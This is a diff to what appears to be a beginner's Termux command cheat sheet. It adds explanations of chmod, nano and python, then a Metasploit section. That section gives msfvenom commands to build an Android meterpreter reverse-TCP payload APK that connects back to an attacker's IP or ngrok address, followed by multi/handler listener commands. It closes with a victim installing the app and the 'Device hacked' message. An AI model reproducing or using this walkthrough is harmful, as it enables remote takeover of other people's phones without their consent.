@@ -8,9 +8,44 @@
 ##usage - type cat 'filename'
 #4. wget - used to download files.
 ##usage - wget 'url' [press enter]
-#5. git - used to clone repositories (GitHub and gitlab only)
+#5. git - [program]used to clone repositories (GitHub and gitlab only)
 ##usage: git clone https://www.github.com/shasankp-create/THEEASYPROJECT.git
 (URL)
-#6. Bash - used to run .sh files.
+#6. bash - used to run .sh files.
 ##usage: bash 'ex.sh' or ./ex.sh
 
+#7. chmod - used to give permissions to scripts.
+##usage: chmod 777 'example.sh' 
+And then write ./example.sh as in case of bash.
+#8. nano - [program] is a text editor like notepad in Windows.
+#9. python -[programming language] is a powerful programming language developed by Guido Van Rossum.
+##installation and usage - pkg install python [current version-3.8]
+python 'example.py' to run it.
+
+
+
+##METASPLOIT FRAMEWORK ##
+#What is Metasploit? Metasploit framework is a tool used for penetration testing...in android, windows, Linux, and Macintosh(Mac) .. except iPhone...😞😞
+#MSFCONSOLE#
+#THIS IS THE METASPLOIT CONSOLE.#
+#TYPE MSFCONSOLE IN TERMUX TO LOAD THE CONSOLE.#
+#MSFVENOM - USED TO CREATE PAYLOADS.#
+#USAGE- msfvenom -p android/meterpreter/reverse_tcp LHOST='IP ADDRESS/NGROK IP(IF YOU ARE USING NGROK)' LPORT ='4444(RECOMMENDED/NGROK PORT- IF YOU ARE USING NGROK)' 'your desired apk'
+##BONUS##
+##METASPLOIT PAYLOADS FOR ANDROID##
+# REVERSE_TCP #
+msfvenom -p android/meterpreter/reverse_tcp LHOST='IP ADDRESS/NGROK IP(IF YOU ARE USING NGROK)' LPORT ='4444(RECOMMENDED/NGROK PORT- IF YOU ARE USING NGROK)''your desired apk'
+
+#load up the msfconsole#
+msf5>use exploit/multi/handler (hit enter)
+msf5>(exploit/mulit/handler)>set payload android/meterpreter/reverse_tcp (hit enter)
+payload>>android/meterpreter/reverse_tcp
+msf5>(exploit/multi/handler)>set lhost localhost (hit enter)
+lhost>>localhost
+msf5>(exploit/multi/handler)>set lport 4444
+lport>>4444
+msf5>(exploit/multi/handler)>exploit -j -z
+
+[When the victim  will install the app on their phone]
+Meterpreter session started on 127.0.0.1
+meterpreter>(voila! Device hacked) type help and hit enter to display the list of available commands.
